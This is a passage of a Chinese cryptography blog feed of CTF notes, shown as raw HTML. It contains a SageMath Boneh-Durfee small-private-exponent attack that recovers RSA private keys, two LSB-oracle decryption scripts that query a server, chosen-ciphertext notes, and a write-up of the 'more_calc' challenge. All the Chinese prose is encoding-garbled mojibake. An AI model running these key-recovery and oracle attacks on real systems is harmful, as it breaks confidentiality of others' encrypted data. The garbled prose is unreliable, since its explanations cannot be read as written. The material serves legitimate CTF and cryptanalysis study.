class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> range(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> range(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x^ii * \pmodulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts list of monomials</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials():</span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:</span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts (selected by Herrman and May)</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> range(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> range(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * \pmodulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift) <span class="comment"># substitution</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts list of monomials</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> range(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> range(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct lattice B</span></span><br><span class="line">    nn = len(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> range(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Prototype to reduce the lattice</span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:</span><br><span class="line">        <span class="comment"># automatically remove</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, \pmodulus^mm, nn<span class="number">-1</span>)</span><br><span class="line">        <span class="comment"># reset dimension</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"failure"</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>,<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if vectors are helpful</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, \pmodulus^mm)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># check if determinant is correctly bounded</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = \pmodulus^(mm*nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"We do not have det &lt; bound. Solutions might not be found."</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Try with highers m and t."</span></span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"size det(L) - size e^(m*n) = "</span>, floor(diff)</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>, <span class="number">-1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, \pmodulus^mm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"optimizing basis of the lattice via LLL, this can take a long time"</span></span><br><span class="line"></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"LLL is done!"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># transform vector i &amp; j -&gt; polynomials 1 &amp; 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"looking for independent vectors in the lattice"</span></span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> range(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> range(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line">            <span class="comment"># for i and j, create the two polynomials</span></span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> range(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># resultant</span></span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># are these good polynomials?</span></span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"found them, using vectors"</span>, pol1_idx, <span class="string">"and"</span>, pol2_idx</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"no independant vectors could be found. This should very rarely happen..."</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(soly) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Your prediction (delta) is too small"</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">example</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">############################################</span></span><br><span class="line">    <span class="comment"># How To Use This Script</span></span><br><span class="line">    <span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># The problem to solve (edit the following values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the modulus</span></span><br><span class="line">    N = <span class="number">0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27L</span></span><br><span class="line">    <span class="comment"># the public exponent</span></span><br><span class="line">    e = <span class="number">0x11722b54dd6f3ad9ce81da6f6ecb0acaf2cbc3885841d08b32abc0672d1a7293f9856db8f9407dc05f6f373a2d9246752a7cc7b1b6923f1827adfaeefc811e6e5989cce9f00897cfc1fc57987cce4862b5343bc8e91ddf2bd9e23aea9316a69f28f407cfe324d546a7dde13eb0bd052f694aefe8ec0f5298800277dbab4a33bbL</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the hypothesis on the private exponent (the theoretical maximum is 0.292)</span></span><br><span class="line">    delta = <span class="number">.18</span> <span class="comment"># this means that d &lt; N^delta</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Lattice (tweak those values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you should tweak this (after a first run), (e.g. increment it until a solution is found)</span></span><br><span class="line">    m = <span class="number">4</span> <span class="comment"># size of the lattice (bigger the better/slower)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you need to be a lattice master to tweak these</span></span><br><span class="line">    t = int((<span class="number">1</span><span class="number">-2</span>*delta) * m)  <span class="comment"># optimization from Herrmann and May</span></span><br><span class="line">    X = <span class="number">2</span>*floor(N^delta)  <span class="comment"># this _might_ be too much</span></span><br><span class="line">    Y = floor(N^(<span class="number">1</span>/<span class="number">2</span>))    <span class="comment"># correct if p, q are ~ same size</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Don't touch anything below</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Problem put in equation</span></span><br><span class="line">    P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    A = int((N+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">    pol = <span class="number">1</span> + x * (A + y)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Find the solutions!</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Checking bounds</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"=== checking values ==="</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"* delta:"</span>, delta</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"* delta &lt; 0.292"</span>, delta &lt; <span class="number">0.292</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"* size of e:"</span>, int(log(e)/log(<span class="number">2</span>))</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"* size of N:"</span>, int(log(N)/log(<span class="number">2</span>))</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"* m:"</span>, m, <span class="string">", t:"</span>, t</span><br><span class="line"></span><br><span class="line">    <span class="comment"># boneh_durfee</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"=== running algorithm ==="</span></span><br><span class="line">        start_time = time.time()</span><br><span class="line"></span><br><span class="line">    solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># found a solution?</span></span><br><span class="line">    <span class="keyword">if</span> solx &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"=== solution found ==="</span></span><br><span class="line">        <span class="keyword">if</span> <span class="literal">False</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"x:"</span>, solx</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"y:"</span>, soly</span><br><span class="line"></span><br><span class="line">        d = int(pol(solx, soly) / e)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"private key found:"</span>, d</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"=== no solution was found ==="</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">"=== %s seconds ==="</span> % (time.time() - start_time))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    example()</span><br></pre></td></tr></table></figure><h1 id="RSA-LSB-Oracle-Attack"><a href="#RSA-LSB-Oracle-Attack" class="headerlink" title="RSA LSB Oracle Attack"></a>RSA LSB Oracle Attack</h1><p>é€‚ç”¨æƒ…å†µï¼šå¯ä»¥é€‰æ‹©å¯†æ–‡å‘é€ç»™æœåŠ¡å™¨ï¼Œå¹¶ä¸”æœåŠ¡å™¨è¿”å›è§£å¯†å¯†æ–‡åçš„æ˜æ–‡çš„<strong>æœ€ä½ä½(LSB)</strong>ã€‚</p><p>åœ¨ä¸€æ¬¡RSAåŠ å¯†ä¸­ï¼Œæ˜æ–‡ä¸ºmï¼Œæ¨¡æ•°ä¸ºnï¼ŒåŠ å¯†æŒ‡æ•°ä¸ºeï¼Œå¯†æ–‡ä¸ºcã€‚æˆ‘ä»¬å¯ä»¥æ„é€ å‡º$câ€™\equiv ((2^e)\cdot c) \equiv ((2^e)\cdot (m^e))\equiv ((2\cdot m)^e) \pmod n$ï¼Œ å› ä¸ºmçš„ä¸¤å€å¯èƒ½å¤§äºnï¼Œæ‰€ä»¥ç»è¿‡è§£å¯†å¾—åˆ°çš„æ˜æ–‡æ˜¯ $mâ€™\equiv (2\cdot m)\pmod n$ ã€‚æˆ‘ä»¬è¿˜èƒ½å¤ŸçŸ¥é“ mâ€™ çš„æœ€ä½ä½lsb æ˜¯1è¿˜æ˜¯0ã€‚ å› ä¸ºnæ˜¯å¥‡æ•°ï¼Œè€Œ$2\cdot m$æ˜¯å¶æ•°ï¼Œæ‰€ä»¥å¦‚æœlsb æ˜¯0ï¼Œè¯´æ˜$(2\cdot m)%n$ æ˜¯å¶æ•°ï¼Œæ²¡æœ‰è¶…è¿‡nï¼Œå³$m&lt;\frac{n}{2}$ï¼Œåä¹‹åˆ™$m&gt;\frac{n}{2}$ã€‚</p><p>ä¸¾ä¸ªä¾‹å­å°±èƒ½æ˜ç™½2 % 3=2 æ˜¯å¶æ•°ï¼Œè€Œ4 % 3=1 æ˜¯å¥‡æ•°ã€‚ä»¥æ­¤ç±»æ¨ï¼Œæ„é€ å¯†æ–‡$câ€™â€™\equiv 4^e\cdot c \pmod n$ ä½¿å…¶è§£å¯†åä¸º$mâ€™â€™\equiv (4\cdot m)\pmod n$ ï¼Œåˆ¤æ–­$mâ€™â€™$ çš„å¥‡å¶æ€§å¯ä»¥çŸ¥é“m å’Œ $\frac{n}{4}$ çš„å¤§å°å…³ç³»ã€‚æ‰€ä»¥æˆ‘ä»¬å°±æœ‰äº†ä¸€ä¸ªäºŒåˆ†ç®—æ³•ï¼Œå¯ä»¥åœ¨å¯¹æ•°æ—¶é—´å†…å°†mçš„èŒƒå›´é€¼è¿‘åˆ°ä¸€ä¸ªè¶³å¤Ÿç‹­çª„çš„ç©ºé—´ã€‚</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_lsb</span><span class="params">(c)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    sh.sendline(str(c))</span><br><span class="line">    rev = sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> int(rev)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">(c,n,t)</span>:</span></span><br><span class="line">    L=<span class="number">0</span></span><br><span class="line">    H=n</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1024</span>):</span><br><span class="line">        c = (t*c) % n</span><br><span class="line">        <span class="keyword">if</span> get_lsb(c) == <span class="number">0</span>:</span><br><span class="line">            H = (L+H) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            L = (L+H) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(L)</span><br><span class="line"></span><br><span class="line">oracle(c, n, pow(m,<span class="number">2</span>,n))</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„è„šæœ¬åœ¨æœ€åä¼šå‡ºç°ä¸€äº›è¯¯å·®ï¼Œå¤§çº¦ä¸€åˆ°ä¸¤ä¸ªå­—ç¬¦ï¼Œå…·ä½“åŸå› å°šä¸æ˜ç¡®ï¼Œä½†æ˜¯ä¸‹é¢è¿™ä¸ªè„šæœ¬æ˜¯æ²¡æœ‰è¯¯å·®çš„ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lsb_oracle_attack</span><span class="params">(encrypted_flag, n, e)</span>:</span></span><br><span class="line"></span><br><span class="line">    flag_count = n_count = <span class="number">1</span></span><br><span class="line">    flag_lower_bound = <span class="number">0</span></span><br><span class="line">    flag_upper_bound = n</span><br><span class="line">    ciphertext = encrypted_flag</span><br><span class="line">    mult = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> flag_upper_bound &gt; flag_lower_bound + <span class="number">1</span>:</span><br><span class="line">        ciphertext = (ciphertext * pow(<span class="number">2</span>, e, n)) % n</span><br><span class="line">        flag_count *= <span class="number">2</span></span><br><span class="line">        n_count = n_count * <span class="number">2</span> - <span class="number">1</span></span><br><span class="line">        print(<span class="string">"bit = %d"</span> % mult)</span><br><span class="line">        mult += <span class="number">1</span></span><br><span class="line">        data=get_lsb(str(ciphertext))</span><br><span class="line">        <span class="keyword">if</span>(data==<span class="number">1</span>):</span><br><span class="line">            flag_upper_bound = n * n_count / flag_count</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag_lower_bound = n * n_count / flag_count</span><br><span class="line">            n_count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> flag_upper_bound</span><br></pre></td></tr></table></figure><h1 id="é€‰æ‹©å¯†æ–‡æ”»å‡»"><a href="#é€‰æ‹©å¯†æ–‡æ”»å‡»" class="headerlink" title="é€‰æ‹©å¯†æ–‡æ”»å‡»"></a>é€‰æ‹©å¯†æ–‡æ”»å‡»</h1><p>é€‚ç”¨æƒ…å†µï¼šå¯ä»¥æ„é€ ä»»æ„å¯†æ–‡ï¼ŒæœåŠ¡å™¨ä¼šè§£å¯†å¯†æ–‡å¹¶è¿”å›å¯¹åº”æ˜æ–‡ã€‚ã€LSB Oracle Attackçš„ç®€æ˜“ç‰ˆæœ¬ã€‘</p><p>åˆ©ç”¨RSAçš„ä¹˜æ³•åŒæ€æ€§è´¨å°±å¥½ã€‚</p><p>è¿™ä¸ªå¥½ç†è§£ï¼Œåœ¨ä¸€ä¸ªRSAåŠ å¯†è¿‡ç¨‹ä¸­ï¼Œæ˜æ–‡ä¸ºmï¼Œå¯†æ–‡ä¸ºcï¼Œæ¨¡æ•°ä¸ºnï¼ŒåŠ å¯†æŒ‡æ•°ä¸ºeï¼Œ</p><p>é€‰å–$x$ä»¥æ»¡è¶³$gcd(x,n) =1$ ä»è€Œä½¿$x$æ¨¡$n$çš„é€†å­˜åœ¨ï¼Œ</p><p>æ„é€ å¯†æ–‡$câ€™ \equiv c\cdot (x^e)  \pmod n$ä½¿è§£å¯†åæ˜æ–‡ä¸º$mâ€™ \equiv (m\cdot x) \pmod n$ï¼Œ</p><p>åˆ™$m\equiv mâ€™\cdot x^{-1} \pmod n $ã€‚</p><p>å¯å‚çœ‹æ¨¡æ„ä¹‰ä¸‹çš„è¿ç®—æ³•åˆ™éƒ¨åˆ†ã€‚ã€$x^{-1} = inverse(x,n)$ã€‘</p><h1 id="RSAç»å…¸éé¢„æœŸ"><a href="#RSAç»å…¸éé¢„æœŸ" class="headerlink" title="RSAç»å…¸éé¢„æœŸ"></a>RSAç»å…¸éé¢„æœŸ</h1><p>è¿™é‡Œæœ€åæ¥ä¸€ä¸ªRSAå¶å°”å‡ºç°çš„ç»å…¸éé¢„æœŸ</p><p>å¦‚æœå‡ºé¢˜äººæ²¡æœ‰è®¾ç½®å¥½æ˜æ–‡å¡«å……ï¼Œè€Œæ˜¯å•å•æŠŠflagä½œä¸ºæ˜æ–‡çš„è¯ï¼Œé€šå¸¸æƒ…å†µä¸‹è¿™ä¸ªæ˜æ–‡éƒ½ä¼šæ¯”è¾ƒçŸ­ï¼ŒçŸ­åˆ°$m&lt;p$ï¼Œï¼ˆ$p$æ˜¯æ¨¡æ•°$n$çš„ä¸€ä¸ªåˆ†è§£ï¼‰é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥åˆ©ç”¨$p$ä½œä¸ºæ¨¡æ•°ç„¶åæ­£å¸¸æ±‚è§£RSAå°±å¯ä»¥æ±‚è§£å¾—åˆ°æ˜æ–‡äº†ã€‚2020ç¥¥äº‘æ¯çš„more_calcè¿™ä¸€é¢˜å°±å¯ä»¥ç›´æ¥è¿™æ ·å­ä¸€æŠŠæ¢­ã€‚ï¼ˆé¢„æœŸè§£çš„åŸç†æ¨èµ·æ¥è¿˜æŒºéº»çƒ¦çš„ï¼Œå›å¤´å¯ä»¥è®°å½•ä¸€ä¸‹ï¼‰</p><p>è‡³äºä¸ºå•¥ï¼Ÿ$c \equiv m^e \pmod n \rightarrow c \equiv m^e \pmod p$ï¼Œå¥½æ¨çš„ï¼Œè‡ªå·±è¯•è¯•~</p><h1 id="Coppersmithç›¸å…³"><a href="#Coppersmithç›¸å…³" class="headerlink" title="Coppersmithç›¸å…³"></a>Coppersmithç›¸å…³</h1><p>ç§»æ­¥<a href="https://jayxv.github.io/2020/08/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bcoppersmith/">å¯†ç å­¦å­¦ä¹ ç¬”è®° ä¹‹ Coppersmithâ€™s Method</a></p>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å°å±‹ </category>
          
          <category> RSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rsa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯†ç å­¦å­¦ä¹ ç¬”è®° ä¹‹ CTF</title>
      <link href="/2020/12/18/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BCTF/"/>
      <url>/2020/12/18/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BCTF/</url>
      
        <content type="html"><![CDATA[<p>è¿™é‡Œæ˜¯å¯¹åœ¨CTFæ¯”èµ›ä¸­é‡è§åˆ°çš„è‡ªè®¤ä¸ºæ¯”è¾ƒå¥½çš„ä¸€äº›é¢˜ç›®çš„æ”¶é›†ã€‚æœ‰ä¸€äº›åœ¨æ¯”èµ›å°å±‹å°±å·²ç»åšäº†åˆ†æçš„ï¼Œè¿™é‡Œå¯èƒ½åªä¼šæä¸€æ‰‹ï¼Œä¸»è¦æ˜¯åˆ†æé‚£äº›è½å•çš„ä½†ä¸é”™çš„é¢˜ç›®ã€‚</p><h3 id="2020ç¥¥äº‘æ¯-more-calc"><a href="#2020ç¥¥äº‘æ¯-more-calc" class="headerlink" title="2020ç¥¥äº‘æ¯-more_calc"></a>2020ç¥¥äº‘æ¯-more_calc</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = b<span class="string">"flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = getStrongPrime(2048)</span><br><span class="line">for i in range(1, (p+1)//2):</span><br><span class="line">    s += pow(i, p-2, p)</span><br><span class="line">s = s % p</span><br><span class="line">q = gmpy2.next_prime(s)</span><br><span class="line">n = p*q</span><br><span class="line">e = 0x10001</span><br><span class="line">c = pow(bytes_to_long(flag), e, n)</span><br><span class="line">print(p)</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure><p>æ˜¯é­”æ”¹çš„å¥¥æ•°é¢˜(2012å¹´æ–°åŠ å¡æ•°å­¦å¥¥æ—åŒ¹å…‹)ï¼Œå¯æ¶ï¼Œæ¬ºè´Ÿäººã€‚</p><p>å·²ç»æœ‰å¤§ä½¬åšäº†<a href="https://blog.csdn.net/cccchhhh6819/article/details/110302200" target="_blank" rel="noopener">é¢„æœŸè§£</a>çš„åˆ†æäº†ã€‚</p><p>ç”±äºæ¨¡æ•°ä¸ºç´ æ•°pï¼Œæ‰€ä»¥é˜¶ä¸ºp-1ï¼Œæ‰€ä»¥p-2å…¶å®å°±ç›¸å½“äº-1ï¼Œå³é¢˜ç›®è¦æ±‚è®¡ç®—</p><p>$1^{-1}+2^{-1}+\dots+(\frac{p-1}{2})^{-1} \pmod p $</p><p>ç„¶åç”±äºä¸€ä¸ªç»„åˆæ•°çš„æ€§è´¨$C^{2i}_p = \frac{p(p-1)(p-2)\dots(p-(2i-1))}{(2i)!}$</p><p>$\frac{2i}{p}C^{2i}_p = \frac{(p-1)(p-2)\dots(p-(2i-1))}{(2i-1)!}\equiv \frac{(-1)(-2)\dots(-(2i-1))}{(2i-1)!}\equiv -1 \pmod p$</p><p>æ‰€ä»¥æœ‰$\sum_\limits{i=1}^{\frac{p-1}{2}}i^{-1}=-\sum_\limits{i=1}^{\frac{p-1}{2}}i^{-1}\frac{2i}{p}C^{2i}_p=-\frac{2}{p}\sum_\limits{i=1}^{\frac{p-1}{2}}C^{2i}_p$</p><p>æ³¨æ„åˆ°$\sum_\limits{i=1}^{\frac{p-1}{2}}C^{2i}_p$ä»æ„ä¹‰ä¸Šä»£è¡¨ä»pä¸ªå…ƒç´ ä¸­å–å‡ºå¶æ•°ä¸ªå…ƒç´ çš„æ–¹æ³•ã€‚ç”±äºpæ˜¯å¥‡æ•°ï¼Œæ‰€ä»¥ä»pä¸ªå…ƒç´ ä¸­å–å‡ºå¶æ•°ä¸ªå…ƒç´ çš„æ–¹æ³•æ•°ç­‰äºä»pä¸ªå…ƒç´ ä¸­å–å‡ºå¥‡æ•°ä¸ªå…ƒç´ çš„æ–¹æ³•æ•°ï¼Œä¸”äºŒè€…ä¹‹å’Œä¸ºä»pä¸­å–å‡ºå…ƒç´ çš„æ–¹æ³•æ•°$2 ^ p$ï¼ˆè¿™æˆ‘æ²¡è¯ï¼Œä¸è¿‡éšä¾¿æµ‹äº†ä¸‹æ˜¯è¿™æ ·çš„ï¼‰ã€‚ç”±äºæ²¡æœ‰è®¡ç®—å–å‡º0ä¸ªå…ƒç´ çš„æƒ…å†µï¼Œæ‰€ä»¥æ­¤å¤„æœ‰$\sum_\limits{i=1}^{\frac{p-1}{2}}C^{2i}_p = 2^{p-1}-1$</p><p>å³$\sum_\limits{i=1}^{\frac{p-1}{2}}i^{-1}\equiv -\frac{2}{p}(2^{p-1}-1)\equiv -(\frac{2^p-2}{p})\pmod p 